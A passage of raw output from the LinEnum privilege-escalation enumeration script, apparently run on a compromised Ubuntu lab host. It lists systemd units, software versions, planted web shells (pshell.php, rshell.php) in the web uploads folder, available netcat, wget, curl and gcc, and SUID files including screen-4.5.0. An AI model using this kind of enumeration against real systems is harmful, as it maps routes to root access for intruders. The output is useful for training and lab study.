-rw-r--r-- 1 root root  473 Feb 15  2017 nss-user-lookup.target                
-rw-r--r-- 1 root root  354 Feb 15  2017 paths.target                          
-rw-r--r-- 1 root root  552 Feb 15  2017 poweroff.target                       
-rw-r--r-- 1 root root  377 Feb 15  2017 printer.target                        
-rw-r--r-- 1 root root  693 Feb 15  2017 proc-sys-fs-binfmt_misc.automount     
-rw-r--r-- 1 root root  603 Feb 15  2017 proc-sys-fs-binfmt_misc.mount         
-rw-r--r-- 1 root root  543 Feb 15  2017 reboot.target                         
-rw-r--r-- 1 root root  396 Feb 15  2017 remote-fs-pre.target                  
-rw-r--r-- 1 root root  482 Feb 15  2017 remote-fs.target                      
-rw-r--r-- 1 root root  486 Feb 15  2017 rescue.target                         
-rw-r--r-- 1 root root  500 Feb 15  2017 rpcbind.target                        
-rw-r--r-- 1 root root  402 Feb 15  2017 shutdown.target                       
-rw-r--r-- 1 root root  362 Feb 15  2017 sigpwr.target                         
-rw-r--r-- 1 root root  420 Feb 15  2017 sleep.target                          
-rw-r--r-- 1 root root  409 Feb 15  2017 slices.target                         
-rw-r--r-- 1 root root  380 Feb 15  2017 smartcard.target                      
-rw-r--r-- 1 root root  356 Feb 15  2017 sockets.target                        
-rw-r--r-- 1 root root  380 Feb 15  2017 sound.target                          
-rw-r--r-- 1 root root  441 Feb 15  2017 suspend.target                        
-rw-r--r-- 1 root root  353 Feb 15  2017 swap.target                           
-rw-r--r-- 1 root root  715 Feb 15  2017 sys-fs-fuse-connections.mount         
-rw-r--r-- 1 root root  719 Feb 15  2017 sys-kernel-config.mount               
-rw-r--r-- 1 root root  662 Feb 15  2017 sys-kernel-debug.mount                
-rw-r--r-- 1 root root  518 Feb 15  2017 sysinit.target                        
-rw-r--r-- 1 root root 1.3K Feb 15  2017 syslog.socket                         
-rw-r--r-- 1 root root  585 Feb 15  2017 system-update.target                  
-rw-r--r-- 1 root root  436 Feb 15  2017 system.slice                          
-rw-r--r-- 1 root root  646 Feb 15  2017 systemd-ask-password-console.path     
-rw-r--r-- 1 root root  574 Feb 15  2017 systemd-ask-password-wall.path        
-rw-r--r-- 1 root root  409 Feb 15  2017 systemd-bus-proxyd.socket             
-rw-r--r-- 1 root root  540 Feb 15  2017 systemd-fsckd.socket                  
-rw-r--r-- 1 root root  524 Feb 15  2017 systemd-initctl.socket                
-rw-r--r-- 1 root root  607 Feb 15  2017 systemd-journald-audit.socket         
-rw-r--r-- 1 root root 1.1K Feb 15  2017 systemd-journald-dev-log.socket       
-rw-r--r-- 1 root root  842 Feb 15  2017 systemd-journald.socket               
-rw-r--r-- 1 root root  591 Feb 15  2017 systemd-networkd.socket               
-rw-r--r-- 1 root root  617 Feb 15  2017 systemd-rfkill.socket                 
-rw-r--r-- 1 root root  450 Feb 15  2017 systemd-tmpfiles-clean.timer          
-rw-r--r-- 1 root root  578 Feb 15  2017 systemd-udevd-control.socket          
-rw-r--r-- 1 root root  570 Feb 15  2017 systemd-udevd-kernel.socket           
-rw-r--r-- 1 root root  395 Feb 15  2017 time-sync.target                      
-rw-r--r-- 1 root root  405 Feb 15  2017 timers.target                         
-rw-r--r-- 1 root root  417 Feb 15  2017 umount.target                         
-rw-r--r-- 1 root root  392 Feb 15  2017 user.slice                            
-rw-r--r-- 1 root root  411 Feb  3  2017 mysql.service                         
-rw-r--r-- 1 root root  311 Feb  3  2017 lxcfs.service                         
-rw-r--r-- 1 root root  342 Feb  2  2017 getty-static.service                  
-rw-r--r-- 1 root root  153 Feb  2  2017 sigpwr-container-shutdown.service     
-rw-r--r-- 1 root root  175 Feb  2  2017 systemd-networkd-resolvconf-update.path                                                                               
-rw-r--r-- 1 root root  715 Feb  2  2017 systemd-networkd-resolvconf-update.service                                                                            
-rw-r--r-- 1 root root  269 Jan 31  2017 setvtrgb.service                      
-rw-r--r-- 1 root root  491 Jan 12  2017 dbus.service                          
-rw-r--r-- 1 root root  106 Jan 12  2017 dbus.socket                           
-rw-r--r-- 1 root root  189 Dec 16  2016 uuidd.service                         
-rw-r--r-- 1 root root  126 Dec 16  2016 uuidd.socket                          
-rw-r--r-- 1 root root  420 Dec  7  2016 resolvconf.service                    
-rw-r--r-- 1 root root  735 Nov 30  2016 networking.service                    
-rw-r--r-- 1 root root  497 Nov 30  2016 ifup@.service                         
-rw-r--r-- 1 root root  631 Nov  3  2016 accounts-daemon.service               
-rw-r--r-- 1 root root  251 Sep 18  2016 open-vm-tools.service                 
-rw-r--r-- 1 root root  285 Jun 16  2016 keyboard-setup.service                
-rw-r--r-- 1 root root  288 Jun 16  2016 console-setup.service                 
lrwxrwxrwx 1 root root   27 May 10  2016 plymouth-log.service -> plymouth-read-write.service                                                                   
lrwxrwxrwx 1 root root   21 May 10  2016 plymouth.service -> plymouth-quit.service                                                                             
-rw-r--r-- 1 root root  412 May 10  2016 plymouth-halt.service                 
-rw-r--r-- 1 root root  426 May 10  2016 plymouth-kexec.service                
-rw-r--r-- 1 root root  421 May 10  2016 plymouth-poweroff.service             
-rw-r--r-- 1 root root  200 May 10  2016 plymouth-quit-wait.service            
-rw-r--r-- 1 root root  194 May 10  2016 plymouth-quit.service                 
-rw-r--r-- 1 root root  244 May 10  2016 plymouth-read-write.service           
-rw-r--r-- 1 root root  416 May 10  2016 plymouth-reboot.service               
-rw-r--r-- 1 root root  532 May 10  2016 plymouth-start.service                
-rw-r--r-- 1 root root  291 May 10  2016 plymouth-switch-root.service          
-rw-r--r-- 1 root root  490 May 10  2016 systemd-ask-password-plymouth.path    
-rw-r--r-- 1 root root  467 May 10  2016 systemd-ask-password-plymouth.service 
-rw-r--r-- 1 root root  986 Apr 26  2016 nginx.service                         
lrwxrwxrwx 1 root root    9 Apr 16  2016 lvm2.service -> /dev/null             
-rw-r--r-- 1 root root  334 Apr 16  2016 dm-event.service                      
-rw-r--r-- 1 root root  248 Apr 16  2016 dm-event.socket                       
-rw-r--r-- 1 root root  380 Apr 16  2016 lvm2-lvmetad.service                  
-rw-r--r-- 1 root root  215 Apr 16  2016 lvm2-lvmetad.socket                   
-rw-r--r-- 1 root root  335 Apr 16  2016 lvm2-lvmpolld.service                 
-rw-r--r-- 1 root root  213 Apr 16  2016 lvm2-lvmpolld.socket                  
-rw-r--r-- 1 root root  658 Apr 16  2016 lvm2-monitor.service                  
-rw-r--r-- 1 root root  382 Apr 16  2016 lvm2-pvscan@.service                  
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel1.target.wants                
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel2.target.wants                
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel3.target.wants                
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel4.target.wants                
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel5.target.wants                
-rw-r--r-- 1 root root  234 Apr  9  2016 acpid.service                         
-rw-r--r-- 1 root root  251 Apr  5  2016 cron.service                          
-rw-r--r-- 1 root root  290 Apr  5  2016 rsyslog.service                       
-rw-r--r-- 1 root root  225 Mar 31  2016 apport-forward.socket                 
-rw-r--r-- 1 root root  142 Mar 31  2016 apport-forward@.service               
-rw-r--r-- 1 root root  455 Mar 29  2016 iscsid.service                        
-rw-r--r-- 1 root root 1.1K Mar 29  2016 open-iscsi.service                    
-rw-r--r-- 1 root root  115 Feb  9  2016 acpid.socket                          
-rw-r--r-- 1 root root  115 Feb  9  2016 acpid.path                            
-rw-r--r-- 1 root root  169 Jan 14  2016 atd.service                           
-rw-r--r-- 1 root root  182 Jan 14  2016 polkitd.service                       
-rw-r--r-- 1 root root  790 Jun  1  2015 friendly-recovery.service             
-rw-r--r-- 1 root root  241 Mar  3  2015 ufw.service                           
-rw-r--r-- 1 root root  250 Feb 24  2015 ureadahead-stop.service               
-rw-r--r-- 1 root root  242 Feb 24  2015 ureadahead-stop.timer                 
-rw-r--r-- 1 root root  401 Feb 24  2015 ureadahead.service                    
-rw-r--r-- 1 root root  283 Dec 28  2014 anacron-resume.service                
-rw-r--r-- 1 root root  183 Dec 28  2014 anacron.service                       
-rw-r--r-- 1 root root  188 Feb 24  2014 rsync.service                         

/lib/systemd/system/sockets.target.wants:                                      
total 0                                
lrwxrwxrwx 1 root root 31 Feb 15  2017 systemd-udevd-control.socket -> ../systemd-udevd-control.socket                                                         
lrwxrwxrwx 1 root root 30 Feb 15  2017 systemd-udevd-kernel.socket -> ../systemd-udevd-kernel.socket                                                           
lrwxrwxrwx 1 root root 25 Feb 15  2017 systemd-initctl.socket -> ../systemd-initctl.socket                                                                     
lrwxrwxrwx 1 root root 32 Feb 15  2017 systemd-journald-audit.socket -> ../systemd-journald-audit.socket                                                       
lrwxrwxrwx 1 root root 34 Feb 15  2017 systemd-journald-dev-log.socket -> ../systemd-journald-dev-log.socket                                                   
lrwxrwxrwx 1 root root 26 Feb 15  2017 systemd-journald.socket -> ../systemd-journald.socket                                                                   
lrwxrwxrwx 1 root root 14 Jan 12  2017 dbus.socket -> ../dbus.socket           

/lib/systemd/system/sysinit.target.wants:                                      
total 0                                
lrwxrwxrwx 1 root root 24 May 15  2017 console-setup.service -> ../console-setup.service                                                                       
lrwxrwxrwx 1 root root 25 May 15  2017 keyboard-setup.service -> ../keyboard-setup.service                                                                     
lrwxrwxrwx 1 root root 19 May 15  2017 setvtrgb.service -> ../setvtrgb.service 
lrwxrwxrwx 1 root root 30 Feb 15  2017 systemd-hwdb-update.service -> ../systemd-hwdb-update.service                                                           
lrwxrwxrwx 1 root root 31 Feb 15  2017 systemd-udev-trigger.service -> ../systemd-udev-trigger.service                                                         
lrwxrwxrwx 1 root root 24 Feb 15  2017 systemd-udevd.service -> ../systemd-udevd.service                                                                       
lrwxrwxrwx 1 root root 20 Feb 15  2017 cryptsetup.target -> ../cryptsetup.target                                                                               
lrwxrwxrwx 1 root root 22 Feb 15  2017 dev-hugepages.mount -> ../dev-hugepages.mount                                                                           
lrwxrwxrwx 1 root root 19 Feb 15  2017 dev-mqueue.mount -> ../dev-mqueue.mount 
lrwxrwxrwx 1 root root 28 Feb 15  2017 kmod-static-nodes.service -> ../kmod-static-nodes.service                                                               
lrwxrwxrwx 1 root root 36 Feb 15  2017 proc-sys-fs-binfmt_misc.automount -> ../proc-sys-fs-binfmt_misc.automount                                               
lrwxrwxrwx 1 root root 32 Feb 15  2017 sys-fs-fuse-connections.mount -> ../sys-fs-fuse-connections.mount                                                       
lrwxrwxrwx 1 root root 26 Feb 15  2017 sys-kernel-config.mount -> ../sys-kernel-config.mount                                                                   
lrwxrwxrwx 1 root root 25 Feb 15  2017 sys-kernel-debug.mount -> ../sys-kernel-debug.mount                                                                     
lrwxrwxrwx 1 root root 36 Feb 15  2017 systemd-ask-password-console.path -> ../systemd-ask-password-console.path                                               
lrwxrwxrwx 1 root root 25 Feb 15  2017 systemd-binfmt.service -> ../systemd-binfmt.service                                                                     
lrwxrwxrwx 1 root root 32 Feb 15  2017 systemd-journal-flush.service -> ../systemd-journal-flush.service                                                       
lrwxrwxrwx 1 root root 27 Feb 15  2017 systemd-journald.service -> ../systemd-journald.service                                                                 
lrwxrwxrwx 1 root root 36 Feb 15  2017 systemd-machine-id-commit.service -> ../systemd-machine-id-commit.service                                               
lrwxrwxrwx 1 root root 31 Feb 15  2017 systemd-modules-load.service -> ../systemd-modules-load.service                                                         
lrwxrwxrwx 1 root root 30 Feb 15  2017 systemd-random-seed.service -> ../systemd-random-seed.service                                                           
lrwxrwxrwx 1 root root 25 Feb 15  2017 systemd-sysctl.service -> ../systemd-sysctl.service                                                                     
lrwxrwxrwx 1 root root 37 Feb 15  2017 systemd-tmpfiles-setup-dev.service -> ../systemd-tmpfiles-setup-dev.service                                             
lrwxrwxrwx 1 root root 33 Feb 15  2017 systemd-tmpfiles-setup.service -> ../systemd-tmpfiles-setup.service                                                     
lrwxrwxrwx 1 root root 30 Feb 15  2017 systemd-update-utmp.service -> ../systemd-update-utmp.service                                                           
lrwxrwxrwx 1 root root 30 May 10  2016 plymouth-read-write.service -> ../plymouth-read-write.service                                                           
lrwxrwxrwx 1 root root 25 May 10  2016 plymouth-start.service -> ../plymouth-start.service                                                                     

/lib/systemd/system/getty.target.wants:                                        
total 0                                
lrwxrwxrwx 1 root root 23 Feb 15  2017 getty-static.service -> ../getty-static.service                                                                         

/lib/systemd/system/graphical.target.wants:                                    
total 0                                
lrwxrwxrwx 1 root root 39 Feb 15  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service                                         

/lib/systemd/system/local-fs.target.wants:                                     
total 0                                
lrwxrwxrwx 1 root root 29 Feb 15  2017 systemd-remount-fs.service -> ../systemd-remount-fs.service                                                             

/lib/systemd/system/multi-user.target.wants:                                   
total 0                                
lrwxrwxrwx 1 root root 15 Feb 15  2017 getty.target -> ../getty.target         
lrwxrwxrwx 1 root root 25 Feb 15  2017 systemd-logind.service -> ../systemd-logind.service                                                                     
lrwxrwxrwx 1 root root 33 Feb 15  2017 systemd-ask-password-wall.path -> ../systemd-ask-password-wall.path                                                     
lrwxrwxrwx 1 root root 39 Feb 15  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service                                         
lrwxrwxrwx 1 root root 32 Feb 15  2017 systemd-user-sessions.service -> ../systemd-user-sessions.service                                                       
lrwxrwxrwx 1 root root 15 Jan 12  2017 dbus.service -> ../dbus.service         
lrwxrwxrwx 1 root root 29 May 10  2016 plymouth-quit-wait.service -> ../plymouth-quit-wait.service                                                             
lrwxrwxrwx 1 root root 24 May 10  2016 plymouth-quit.service -> ../plymouth-quit.service                                                                       

/lib/systemd/system/poweroff.target.wants:                                     
total 0                                
lrwxrwxrwx 1 root root 39 Feb 15  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service                                         
lrwxrwxrwx 1 root root 28 May 10  2016 plymouth-poweroff.service -> ../plymouth-poweroff.service                                                               

/lib/systemd/system/rc-local.service.d:                                        
total 4.0K                             
-rw-r--r-- 1 root root 290 Feb  2  2017 debian.conf                            

/lib/systemd/system/reboot.target.wants:                                       
total 0                                
lrwxrwxrwx 1 root root 39 Feb 15  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service                                         
lrwxrwxrwx 1 root root 26 May 10  2016 plymouth-reboot.service -> ../plymouth-reboot.service                                                                   

/lib/systemd/system/rescue.target.wants:                                       
total 0                                
lrwxrwxrwx 1 root root 39 Feb 15  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service                                         

/lib/systemd/system/resolvconf.service.wants:                                  
total 0                                
lrwxrwxrwx 1 root root 42 Feb 15  2017 systemd-networkd-resolvconf-update.path -> ../systemd-networkd-resolvconf-update.path                                   

/lib/systemd/system/sigpwr.target.wants:                                       
total 0                                
lrwxrwxrwx 1 root root 36 Feb 15  2017 sigpwr-container-shutdown.service -> ../sigpwr-container-shutdown.service                                               

/lib/systemd/system/systemd-timesyncd.service.d:                               
total 4.0K                             
-rw-r--r-- 1 root root 251 Feb  2  2017 disable-with-time-daemon.conf          

/lib/systemd/system/timers.target.wants:                                       
total 0                                
lrwxrwxrwx 1 root root 31 Feb 15  2017 systemd-tmpfiles-clean.timer -> ../systemd-tmpfiles-clean.timer                                                         

/lib/systemd/system/halt.target.wants: 
total 0                                
lrwxrwxrwx 1 root root 24 May 10  2016 plymouth-halt.service -> ../plymouth-halt.service                                                                       

/lib/systemd/system/initrd-switch-root.target.wants:                           
total 0                                
lrwxrwxrwx 1 root root 25 May 10  2016 plymouth-start.service -> ../plymouth-start.service                                                                     
lrwxrwxrwx 1 root root 31 May 10  2016 plymouth-switch-root.service -> ../plymouth-switch-root.service                                                         

/lib/systemd/system/kexec.target.wants:                                        
total 0                                
lrwxrwxrwx 1 root root 25 May 10  2016 plymouth-kexec.service -> ../plymouth-kexec.service                                                                     

/lib/systemd/system/busnames.target.wants:                                     
total 0                                

/lib/systemd/system/runlevel1.target.wants:                                    
total 0                                

/lib/systemd/system/runlevel2.target.wants:                                    
total 0                                

/lib/systemd/system/runlevel3.target.wants:                                    
total 0                                

/lib/systemd/system/runlevel4.target.wants:                                    
total 0                                

/lib/systemd/system/runlevel5.target.wants:                                    
total 0                                

/lib/systemd/system-sleep:             
total 4.0K                             
-rwxr-xr-x 1 root root 92 Mar 17  2016 hdparm                                  

/lib/systemd/network:                  
total 12K                              
-rw-r--r-- 1 root root 404 Feb 15  2017 80-container-host0.network             
-rw-r--r-- 1 root root 482 Feb 15  2017 80-container-ve.network                
-rw-r--r-- 1 root root  80 Feb 15  2017 99-default.link                        

/lib/systemd/system-generators:        
total 680K                             
-rwxr-xr-x 1 root root  71K Feb 15  2017 systemd-cryptsetup-generator          
-rwxr-xr-x 1 root root  59K Feb 15  2017 systemd-dbus1-generator               
-rwxr-xr-x 1 root root  43K Feb 15  2017 systemd-debug-generator               
-rwxr-xr-x 1 root root  79K Feb 15  2017 systemd-fstab-generator               
-rwxr-xr-x 1 root root  39K Feb 15  2017 systemd-getty-generator               
-rwxr-xr-x 1 root root 119K Feb 15  2017 systemd-gpt-auto-generator            
-rwxr-xr-x 1 root root  39K Feb 15  2017 systemd-hibernate-resume-generator    
-rwxr-xr-x 1 root root  39K Feb 15  2017 systemd-insserv-generator             
-rwxr-xr-x 1 root root  35K Feb 15  2017 systemd-rc-local-generator            
-rwxr-xr-x 1 root root  31K Feb 15  2017 systemd-system-update-generator       
-rwxr-xr-x 1 root root 103K Feb 15  2017 systemd-sysv-generator                
-rwxr-xr-x 1 root root  11K Apr 16  2016 lvm2-activation-generator             

/lib/systemd/system-preset:            
total 4.0K                             
-rw-r--r-- 1 root root 869 Feb 15  2017 90-systemd.preset                      

/lib/systemd/system-shutdown:          
total 0                                


### SOFTWARE #############################################                     
[-] Sudo version:                      
Sudo version 1.8.16                    


[-] MYSQL version:                     
mysql  Ver 14.14 Distrib 5.7.18, for Linux (x86_64) using  EditLine wrapper    


[-] www home dir contents:             
/var/www/:                             
total 12K                              
drwxr-xr-x  3 root root 4.0K May 16  2017 .                                    
drwxr-xr-x 14 root root 4.0K May 16  2017 ..                                   
drwxr-xr-x  3 root root 4.0K May 19  2017 html                                 

/var/www/html:                         
total 444K                             
drwxr-xr-x 3 root     root     4.0K May 19  2017 .                             
drwxr-xr-x 3 root     root     4.0K May 16  2017 ..                            
-rwxr-xr-x 1 root     root     114K May 15  2017 bounce.jpg                    
-rwxr-xr-x 1 root     root     164K May 15  2017 carrie.jpg                    
-rwxr-xr-x 1 root     root      921 May 15  2017 exposed.php                   
-rwxr-xr-x 1 root     root      141 May 15  2017 hair.html                     
-rwxr-xr-x 1 root     root      144 May 15  2017 index.html                    
-rwxr-xr-x 1 root     root     133K May 15  2017 sea.jpg                       
-rwxr-xr-x 1 root     root      223 May 15  2017 test.html                     
drwxr-xr-x 2 www-data www-data 4.0K Jan  9 17:26 uploads                       

/var/www/html/uploads:                 
total 132K                             
drwxr-xr-x 2 www-data www-data 4.0K Jan  9 17:26 .                             
drwxr-xr-x 3 root     root     4.0K May 19  2017 ..                            
-rwxr-xr-x 1 www-data www-data 114K May 19  2017 bounce.jpg                    
-rw-r--r-- 1 www-data www-data 2.3K Jan  9 17:26 pshell.php                    
-rw-r--r-- 1 www-data www-data   43 Jan  9 17:19 rshell.php                    


### INTERESTING FILES ####################################                     
[-] Useful file locations:             
/bin/nc                                
/bin/netcat                            
/usr/bin/wget                          
/usr/bin/gcc                           
/usr/bin/curl                          


[-] Installed compilers:               
ii  gcc                                4:5.3.1-1ubuntu1                           amd64        GNU C compiler                                                  
ii  gcc-5                              5.4.0-6ubuntu1~16.04.4                     amd64        GNU C compiler                                                  
rc  libxkbcommon0:amd64                0.5.0-1ubuntu2                             amd64        library interface to the XKB compiler - shared library          


[-] Can we read/write sensitive files: 
-rw-r--r-- 1 root root 1751 May 22  2017 /etc/passwd                           
-rw-r--r-- 1 root root 886 May 16  2017 /etc/group                             
-rw-r--r-- 1 root root 575 Oct 22  2015 /etc/profile                           
-rw-r----- 1 root shadow 1123 May 22  2017 /etc/shadow                         


[-] SUID files:                        
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g                        
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6                           
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount                      
-rwsr-xr-x 1 root root 40128 May  4  2017 /bin/su                              
-rwsr-xr-x 1 root root 40152 Dec 16  2016 /bin/mount                           
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping                            
-rwsr-xr-x 1 root root 27608 Dec 16  2016 /bin/umount                          
-rwsr-xr-x 1 root root 136808 Jan 20  2017 /usr/bin/sudo                       
-rwsr-xr-x 1 root root 23376 Jan 18  2016 /usr/bin/pkexec                      
-rwsr-xr-x 1 root root 32944 May  4  2017 /usr/bin/newuidmap                   
-rwsr-xr-x 1 root root 39904 May  4  2017 /usr/bin/newgrp                      
-rwsr-xr-x 1 root root 32944 May  4  2017 /usr/bin/newgidmap                   
-rwsr-xr-x 1 root root 75304 May  4  2017 /usr/bin/gpasswd                     
-rwsr-sr-x 1 daemon daemon 51464 Jan 14  2016 /usr/bin/at                      
-rwsr-xr-x 1 root root 54256 May  4  2017 /usr/bin/passwd                      
-rwsr-xr-x 1 root root 1588648 May 19  2017 /usr/bin/screen-4.5.0              
-rwsr-xr-x 1 root root 40432 May  4  2017 /usr/bin/chsh                        
-rwsr-xr-x 1 root root 49584 May  4  2017 /usr/bin/chfn                        
-rwsr-xr-x 1 root root 38984 Mar  7  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic                                                                           
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                    
-rwsr-xr-x 1 root root 208680 Apr 29  2017 /usr/lib/snapd/snap-confine         
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device    
-rwsr-xr-x 1 root root 428240 Mar 16  2017 /usr/lib/openssh/ssh-keysign        
-rwsr-xr-x 1 root root 14864 Jan 18  2016 /usr/lib/policykit-1/polkit-agent-helper-1                                                                           


[-] SGID files:                        
-rwxr-sr-x 1 root shadow 35600 Mar 16  2016 /sbin/unix_chkpwd                  
-rwxr-sr-x 1 root shadow 35632 Mar 16  2016 /sbin/pam_extrausers_chkpwd        
-rwxr-sr-x 1 root mlocate 39520 Nov 18  2014 /usr/bin/mlocate                  
-rwxr-sr-x 1 root shadow 62336 May  4  2017 /usr/bin/chage                     
-rwxr-sr-x 1 root utmp 434216 Feb  7  2016 /usr/bin/screen.old                 
-rwxr-sr-x 1 root crontab 36080 Apr  5  2016 /usr/bin/crontab                  
-rwxr-sr-x 1 root tty 14752 Mar  1  2016 /usr/bin/bsd-write                    
-rwxr-sr-x 1 root shadow 22768 May  4  2017 /usr/bin/expiry                    
-rwxr-sr-x 1 root ssh 358624 Mar 16  2017 /usr/bin/ssh-agent                   
-rwsr-sr-x 1 daemon daemon 51464 Jan 14  2016 /usr/bin/at                      
-rwxr-sr-x 1 root tty 27368 Dec 16  2016 /usr/bin/wall                         
-rwxr-sr-x 1 root utmp 10232 Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter                                                                          


[+] Files with POSIX capabilities set: 
/usr/bin/mtr = cap_net_raw+ep          
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep              
/usr/bin/traceroute6.iputils = cap_net_raw+ep                                  


[-] World-writable files (excluding /proc and /sys):                           
-rw-rw-rw- 1 www-data www-data 46488 Jan  9 17:34 /dev/shm/LinEnum.sh          
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/cgroup.event_control                                                                        
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/init.scope/cgroup.event_control                                                             
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control                                                           
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/mdadm.service/cgroup.event_control                                             
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/dev-sda5.swap/cgroup.event_control                                             
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control                                              
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/ifup@ens160.service/cgroup.event_control                                       
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-by-path-pci-0000:0b:00.0-scsi-0:0:0:0-part5.swap/cgroup.event_control 
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/var-lib-lxcfs.mount/cgroup.event_control                                       
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control                                              
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control                                      
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/rc-local.service/cgroup.event_control                                          
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/apport.service/cgroup.event_control                                            
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-modules-load.service/cgroup.event_control                              
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-by-uuid-21936632-4433-4221-ba64-7a75ed493f1a.swap/cgroup.event_control
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/iscsid.service/cgroup.event_control                                            
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control                               
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/-.mount/cgroup.event_control                                                   
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/lightdm.service/cgroup.event_control                                           
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/open-iscsi.service/cgroup.event_control                                        
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/networking.service/cgroup.event_control                                        
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/nginx.service/cgroup.event_control                                             
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/ufw.service/cgroup.event_control                                               
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control                                   
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/resolvconf.service/cgroup.event_control                                        
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control                                               
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-user-sessions.service/cgroup.event_control                             
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control                                  
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control                             
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup.service/cgroup.event_control                            
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control                             
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/grub-common.service/cgroup.event_control                                       
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-sysctl.service/cgroup.event_control                                    
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/snapd.service/cgroup.event_control                                             
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/ondemand.service/cgroup.event_control                                          
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/lvm2-monitor.service/cgroup.event_control                                      
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control                                          
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup-dev.service/cgroup.event_control                        
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control                                 
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control                                               
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control                                    
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-journal-flush.service/cgroup.event_control                             
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-random-seed.service/cgroup.event_control                               
